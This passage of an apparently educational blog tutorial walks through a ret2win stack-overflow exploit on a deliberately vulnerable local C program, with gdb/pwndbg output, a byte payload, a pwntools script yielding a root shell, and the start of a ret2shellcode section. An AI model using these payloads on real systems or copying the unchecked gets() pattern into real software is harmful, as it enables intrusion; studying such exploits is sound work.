<p>The¬†<strong>libraries</strong>¬†section houses shared and static libraries, such as¬†<code>libc</code>, which provide essential functions to the program. These shared libraries are loaded once but used across multiple processes to optimize memory usage. However, insecure library functions (like¬†<code>strcpy</code>¬†or¬†<code>gets</code>) can introduce vulnerabilities if they allow unchecked buffer operations.</p>
<h3 id="stack">Stack</h3>
<p>Finally, the¬†<strong>stack</strong>¬†plays a critical role in function execution and local variable storage. It grows downward toward lower addresses and manages function call frames, return addresses, arguments, and local variables. <strong>Use the stack for small, short-lived data</strong>¬†like local variables and function calls it&rsquo;s fast but limited in size. Example:¬†<code>int x = 10;</code>¬†(freed automatically when the function ends). Its fixed static size.</p>
<p><img src="/img/memory-layout.jpg" alt="memory-layout.jpg"></p>
<p>Do Stack Overflow module from HackTheBox Academy for depth.</p>
<h3 id="stack-overflow-ret2win">Stack Overflow Ret2Win</h3>
<p>In a ret2win challenge, you&rsquo;re given a compiled binary where there&rsquo;s a function usually named <code>ret2win()</code> that you <strong>are not supposed to be able to reach directly</strong>. Your goal is to <strong>exploit a buffer overflow</strong> to <strong>overwrite the return address</strong> on the stack and redirect execution to this hidden or unused function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[1;31m[+] PWNED!!!</span><span style="color:#ae81ff">\033</span><span style="color:#e6db74">[0m&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/bin/sh&#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uid_t</span> uid;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
</span></span><span style="display:flex;"><span>  uid <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresuid</span>(uid, uid, uid);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">init</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> number <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">30</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter Your Name - &#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gets</span>(buff);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Value Of Number Is - %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,number);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>gcc ret2win.c -o ret2win -no-pie -fno-stack-protector</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la
</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">2</span> at0m at0m  <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 21:13 .
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">21</span> at0m at0m  <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 17:03 ..
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">17048</span> Jun <span style="color:#ae81ff">26</span> 17:03 ret2win
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./ret2win
</span></span><span style="display:flex;"><span>Enter Your Name - at0m
</span></span><span style="display:flex;"><span>Value Of Number Is - <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ ./ret2win
</span></span><span style="display:flex;"><span>Enter Your Name - hacker
</span></span><span style="display:flex;"><span>Value Of Number Is - <span style="color:#ae81ff">8</span>
</span></span></code></pre></div><p>Trying classic hacker move spamming.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./ret2win
</span></span><span style="display:flex;"><span>Enter Your Name - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style="display:flex;"><span>Value Of Number Is - <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>    <span style="color:#ae81ff">523390</span> segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>  ./ret2win
</span></span></code></pre></div><p>We got segmentation fault error which means we are trying to access to memory address that doesn&rsquo;t exist. We also see value of number is <code>41414141</code> . The value <code>41414141</code> shown in the output is the hexadecimal representation of the characters <code>'AAAA'</code>. When the program reads the input and stores it in a buffer without proper bounds checking, the excessive <code>'A'</code>s begin to overwrite adjacent memory, including saved registers or return addresses. We can confirm that it has stack overflow.</p>
<p>Let&rsquo;s view it in GDB first and then using <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000401000  _init
</span></span><span style="display:flex;"><span>0x00000000004010b0  puts@plt
</span></span><span style="display:flex;"><span>0x00000000004010c0  setresuid@plt
</span></span><span style="display:flex;"><span>0x00000000004010d0  setresgid@plt
</span></span><span style="display:flex;"><span>0x00000000004010e0  printf@plt
</span></span><span style="display:flex;"><span>0x00000000004010f0  geteuid@plt
</span></span><span style="display:flex;"><span>0x0000000000401100  gets@plt
</span></span><span style="display:flex;"><span>0x0000000000401110  getegid@plt
</span></span><span style="display:flex;"><span>0x0000000000401120  execl@plt
</span></span><span style="display:flex;"><span>0x0000000000401130  _start
</span></span><span style="display:flex;"><span>0x0000000000401160  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>0x0000000000401170  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004011a0  register_tm_clones
</span></span><span style="display:flex;"><span>0x00000000004011e0  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x0000000000401210  frame_dummy
</span></span><span style="display:flex;"><span>0x0000000000401216  win
</span></span><span style="display:flex;"><span>0x0000000000401259  init
</span></span><span style="display:flex;"><span>0x00000000004012a6  main
</span></span><span style="display:flex;"><span>0x0000000000401310  __libc_csu_init
</span></span><span style="display:flex;"><span>0x0000000000401380  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x0000000000401388  _fini
</span></span></code></pre></div><p>These are all functions in the program since its <code>ret2win</code> challenge we know we need to return <code>win()</code> function which has our flag.</p>
<p>Install it via this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -qsL <span style="color:#e6db74">&#39;https://install.pwndbg.re&#39;</span> | sh -s -- -t pwndbg-gdb
</span></span></code></pre></div><p><img src="/img/pwn.png" alt="pwn.png"></p>
<p>Now if we run it we see when we press enter we get this:</p>
<p><img src="/img/pwn2.png" alt="pwn2.png"></p>
<p>In above we see that in address <code>&lt;main+91&gt;</code> it tries to return the address <code>&lt;0x4141414141414141&gt;</code> but its not the real address its the address that we have putted by spamming a bunch of <code>A</code>. So theoretically if we could put address of <code>win()</code> function it would point there and we should be able to get flag. But we don‚Äôt yet know exactly how many <code>A</code>s it takes to reach the return address (RIP). Right now, we‚Äôre just blindly smashing the stack with <code>A</code>s, and while we do see that the return address becomes something like <code>0x4141414141414141</code> (which is <code>'A'</code> in hex), this isn&rsquo;t precise enough for a real exploit.</p>
<p>To take control of program execution, we need to know the exact point at which our input starts overwriting the return address. This offset is crucial too few <code>A</code>s and we don‚Äôt reach RIP, too many and we overwrite it incorrectly. Our next step is to use a technique like a <strong>cyclic pattern (cyclic sequence)</strong>, which generates a unique string where every offset is distinguishable. When the program crashes, we can look at the value in RIP and trace it back to the exact position in the input. Once we know the offset, we can replace that part of our payload with the actual address of the <code>win()</code> function.</p>
<p>We can put this value to create distinguishable address:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO
</span></span></code></pre></div><p><img src="/img/pwn3.png" alt="pwn3.png"></p>
<p>As we can see when we run it we get Invalid address<code>0x7f004f4f4f4f</code>. At end we got <code>4f</code> in we unhex it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; python print<span style="color:#f92672">(</span>bytes.fromhex<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;4f&#34;</span><span style="color:#f92672">)</span>.decode<span style="color:#f92672">())</span>
</span></span><span style="display:flex;"><span>O
</span></span></code></pre></div><p>This confirms that the crash occurred right when the program tried to return to the address we filled with <code>OOOO</code>. That means our input reached and <strong>overwrote the return address</strong> with the bytes for <code>OOOO</code>.so if we put the address of <code>win()</code> function instead of <code>OOOO</code> it should give us flag. Now we can control address.</p>
<p>First Let&rsquo;s get offset value. In a buffer overflow, the <strong>offset</strong> is the <strong>exact number of bytes</strong> (or characters) it takes to reach and <strong>overwrite the return address</strong> on the stack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; python print<span style="color:#f92672">(</span>len<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN&#39;</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56</span>
</span></span></code></pre></div><p>So offset is 56 bytes. From above <code>gdb</code> command we had the address of <code>win</code> function which was <code>0x0000000000401216</code> but we cant directly but it like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN0x0000000000401216
</span></span></code></pre></div><p>You can‚Äôt simply append the address of the <code>win()</code> function as a plain string like <code>&quot;0x0000000000401216&quot;</code> because memory and the CPU expect addresses in a binary format, not as readable text. Endianness is the order in which bytes are stored in memory to represent multi-byte data like integers or addresses. In <strong>little-endian</strong> systems, the least significant byte (the ‚Äúsmallest‚Äù part) is stored at the lowest memory address first, meaning the bytes are arranged from smallest to largest. In contrast, <strong>big-endian</strong> systems store the most significant byte first at the lowest memory address, arranging bytes from largest to smallest. For example, the 4-byte number <code>0x12345678</code> would be stored as <code>78 56 34 12</code> in little-endian, but as <code>12 34 56 78</code> in big-endian. So our payload should be in little-endian format which is just reverse of address. Our current address is <code>0x0000000000401216</code> now in little-endian format just reverse it  <code>\x16\x12\x40\x00\x00\x00\x00\x00</code>. So our payload will be:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN<span style="color:#ae81ff">\x</span>16<span style="color:#ae81ff">\x</span>12<span style="color:#ae81ff">\x</span>40<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span> 
</span></span></code></pre></div><p>Lets run it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./ret2win
</span></span><span style="display:flex;"><span>Enter Your Name - AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN<span style="color:#ae81ff">\x</span>16<span style="color:#ae81ff">\x</span>12<span style="color:#ae81ff">\x</span>40<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span>00<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>Value Of Number Is - 4c4c4c4c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>    <span style="color:#ae81ff">5277</span> segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>  ./ret2win
</span></span></code></pre></div><p>We got an error because when we typed the payload manually with <code>\x16\x12\x40...</code>, the program read those characters literally as the text <code>\</code>, <code>x</code>, <code>1</code>, <code>6</code>, and so on instead of interpreting them as the raw binary bytes for the address. To fix this, we need to send the actual byte values, for example by using <code>echo -e</code> or a script that sends the binary data correctly.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ echo -e <span style="color:#e6db74">&#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN\x16\x12\x40\x00\x00\x00\x00\x00&#39;</span> | ./ret2win
</span></span><span style="display:flex;"><span>Enter Your Name - Value Of Number Is - 4c4c4c4c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PWNED!!!
</span></span></code></pre></div><p>And we PWNED the program since I am running this program locally we won&rsquo;t get flag. But we don&rsquo;t want flag only we want whole shell as root. It would be more fun than just flag. Its not like we didn&rsquo;t got shell we got it but it exits immediately. So to receive it and run we can run this payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN\x16\x12\x40\x00\x00\x00\x00\x00&#39;</span>; cat<span style="color:#f92672">)</span> | ./ret2win
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ <span style="color:#f92672">(</span>echo -e <span style="color:#e6db74">&#39;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN\x16\x12\x40\x00\x00\x00\x00\x00&#39;</span>; cat<span style="color:#f92672">)</span> | ./ret2win
</span></span><span style="display:flex;"><span>Enter Your Name - Value Of Number Is - 4c4c4c4c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PWNED!!!
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>at0m<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>at0m<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,105<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,125<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>,128<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Now writing exploit in Python. Its more easier and we don&rsquo;t have to do that <code>cat</code> thing.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the binary so we can access symbols like &#39;win&#39;</span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;ret2win&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the process locally</span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;ret2win&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create payload:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cyclic(56) generates 56 bytes padding to reach return address (offset)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p64 packs the address of &#39;win&#39; function in little-endian 8-byte format</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">56</span>) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>win)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the payload to the program</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Give control to user for interactive shell/session after exploit runs</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h3 id="stack-overflow-ret2shellcode">Stack Overflow Ret2Shellcode</h3>
<p>In real world we won&rsquo;t have <code>win()</code> function that will give us shell. We have to get shell often using this method.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ls -la ret2shellcode                                      
</span></span><span style="display:flex;"><span>-rwsrwxr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">17496</span> Jun <span style="color:#ae81ff">26</span> 17:03 ret2shellcode
</span></span></code></pre></div><p>Shellcode is a small, low-level piece of code injected into a program to gain control, often spawning a shell for command execution. It directly injects into memory so it doesn&rsquo;t need to be compiled. Its in little-endian format. Even assembly language is considered a <strong>higher-level representation</strong> than shellcode. <strong>Shellcode</strong>, on the other hand, is the <strong>raw machine code bytes</strong> (binary instructions) that the CPU executes directly.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./ret2shellcode
</span></span><span style="display:flex;"><span>We have just fixed the plumbing systm, let<span style="color:#e6db74">&#39;s hope there&#39;</span>s no leaks!
</span></span><span style="display:flex;"><span>&gt;.&gt; aaaaah shiiit wtf is dat address doin here...  0x7ffdcc65b0a0
</span></span></code></pre></div><p>As we can see its currently leaking address which can be very harmful. First we have to run again to check if the address that we are getting is static or randomized.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./ret2shellcode
</span></span><span style="display:flex;"><span>We have just fixed the plumbing systm, let<span style="color:#e6db74">&#39;s hope there&#39;</span>s no leaks!
</span></span><span style="display:flex;"><span>&gt;.&gt; aaaaah shiiit wtf is dat address doin here...  0x7ffc2ed07f60
</span></span></code></pre></div><p>So it&rsquo;s randomized since address are different. But first let&rsquo;s find out whats this address is of. Viewing its functions in <code>pwndbg</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x0000000000001000  _init
</span></span><span style="display:flex;"><span>0x0000000000001030  setvbuf@plt
</span></span><span style="display:flex;"><span>0x0000000000001040  std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;::operator&lt;&lt;<span style="color:#f92672">(</span>void const*<span style="color:#f92672">)</span>@plt
</span></span><span style="display:flex;"><span>0x0000000000001050  __cxa_atexit@plt
</span></span><span style="display:flex;"><span>0x0000000000001060  std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;<span style="color:#f92672">(</span>std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*<span style="color:#f92672">)</span>@plt
</span></span><span style="display:flex;"><span>0x0000000000001070  std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;::operator&lt;&lt;<span style="color:#f92672">(</span>std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; <span style="color:#f92672">(</span>*<span style="color:#f92672">)(</span>std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;<span style="color:#f92672">))</span>@plt
</span></span><span style="display:flex;"><span>0x0000000000001080  read@plt
</span></span><span style="display:flex;"><span>0x0000000000001090  std::ios_base::Init::Init<span style="color:#f92672">()</span>@plt
</span></span><span style="display:flex;"><span>0x00000000000010a0  _start
</span></span><span style="display:flex;"><span>0x00000000000010d0  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000001100  register_tm_clones
</span></span><span style="display:flex;"><span>0x0000000000001140  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x0000000000001190  frame_dummy
</span></span><span style="display:flex;"><span>0x0000000000001199  main
</span></span><span style="display:flex;"><span>0x0000000000001296  __static_initialization_and_destruction_0<span style="color:#f92672">(</span>int, int<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x00000000000012df  _GLOBAL__sub_I_main
</span></span><span style="display:flex;"><span>0x0000000000001300  __libc_csu_init
</span></span><span style="display:flex;"><span>0x0000000000001370  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x0000000000001378  _fini
</span></span></code></pre></div><p>This code is definitely of C++ as it has this ugly syntax. If we run command <code>disassemble main</code> it will give us assembly of main function.</p>
<p><img src="/img/pwn4.png" alt="pwn4.png"></p>
<p>Setting up breakpoint at return address of main function which is <code>main+252</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; break main+252
</span></span><span style="display:flex;"><span>Function <span style="color:#e6db74">&#34;main+252&#34;</span> not defined.
</span></span><span style="display:flex;"><span>pwndbg&gt; break *main+252
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x1295
</span></span><span style="display:flex;"><span>pwndbg&gt; run
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/ret2shellcode 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>We have just fixed the plumbing systm, let<span style="color:#e6db74">&#39;s hope there&#39;</span>s no leaks!
</span></span><span style="display:flex;"><span>&gt;.&gt; aaaaah shiiit wtf is dat address doin here...  0x7fffb97349a0
</span></span><span style="display:flex;"><span>AAAABBBBCCCCDDDDEEEEFFFF 
</span></span></code></pre></div><p>After giving input <code>AAAABBBBCCCCDDDDEEEEFFFF</code> we can also examine the address that we currently are shown in program which is <code>0x7fffb97349a0</code>. If we examine it as string in pwngdb using command <code>x/s</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; x/s 0x7fffb97349a0
</span></span><span style="display:flex;"><span>0x7fffb97349a0:	<span style="color:#e6db74">&#34;AAAABBBBCCCCDDDDEEEEFFFF\nJs\271\377\177&#34;</span>
</span></span></code></pre></div><p>We can see its the address of our input. Lets put a bunch of values to check whether it has stack overflow or not. We can use command <code>cyclic</code> for it to get a specific pattern of payload rather than typing it out.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; cyclic <span style="color:#ae81ff">120</span>
</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaa
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>Starting program: /home/at0m/ret2shellcode 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
</span></span><span style="display:flex;"><span>We have just fixed the plumbing systm, let<span style="color:#e6db74">&#39;s hope there&#39;</span>s no leaks!
</span></span><span style="display:flex;"><span>&gt;.&gt; aaaaah shiiit wtf is dat address doin here...  0x7ffd774ceba0
</span></span><span style="display:flex;"><span>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaa
